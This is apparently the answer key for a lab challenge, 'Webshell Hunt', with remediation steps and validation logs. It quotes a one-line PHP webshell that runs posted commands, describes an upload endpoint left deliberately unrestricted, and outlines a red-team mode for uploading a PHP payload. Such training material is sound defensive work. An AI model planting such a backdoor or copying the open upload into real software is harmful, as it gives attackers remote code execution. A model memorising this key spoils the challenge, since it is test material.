# Challenge 09 Answer Key — Webshell Hunt

**DO NOT READ BEFORE ATTEMPTING THE CHALLENGE**

## What's broken / planted
`site/uploads/thumb_8f2a.php` is a planted backdoor: `if (isset($_POST['cmd'])) { system($_POST['cmd']); }`, baked into the image at `docker build` time alongside the legitimate `site/index.html` and `site/uploads/welcome.txt`. The container serves the whole `site/` tree via PHP's built-in server, so any `.php` file under the web root executes.

`site/upload.php` is a real, unrestricted-file-upload endpoint (the "share your widget photo" form on the homepage) with no extension/MIME allowlisting — it's how the backdoor could plausibly have gotten there, and it's still open. `VARIANT=redteam docker compose up -d --build` boots the same box with `upload.php` present but `thumb_8f2a.php` not pre-planted, as an ungraded attack-practice mode (upload your own `.php` payload, get code execution, see the path firsthand).

## Step-by-step fix
1. `docker compose exec web sh`
2. `grep -rl 'system(' /var/www/html` — finds `/var/www/html/uploads/thumb_8f2a.php` as the only match.
3. `rm /var/www/html/uploads/thumb_8f2a.php`
4. `exit`, then `./scripts/score_me.sh` from the host to confirm `3 / 3`.
5. (Bonus) Harden `upload.php` against executable uploads — e.g. reject any filename not ending in an image extension before calling `move_uploaded_file`. Re-run `./scripts/score_me.sh` to confirm the bonus check now passes too (`4 / 4`).

## Validation
Ran a fresh `docker compose up -d --build` on 2026-08-14, confirmed `./scripts/score_me.sh` showed `2 / 3` (backdoor present, site/legit-file both already fine), then applied the steps above verbatim and confirmed `3 / 3`. Torn down with `docker compose down -v` afterward.

Re-validated on 2026-09-16 after adding the real `upload.php` endpoint and `VARIANT` toggle: confirmed default mode still scores `3 / 3` after step 3, confirmed the bonus check fails until `upload.php` is hardened per step 5 and then passes (`4 / 4`), and confirmed `VARIANT=redteam docker compose up -d --build` boots with no `thumb_8f2a.php` present while `upload.php` still accepts and executes an uploaded `.php` payload. Torn down with `docker compose down -v` afterward.
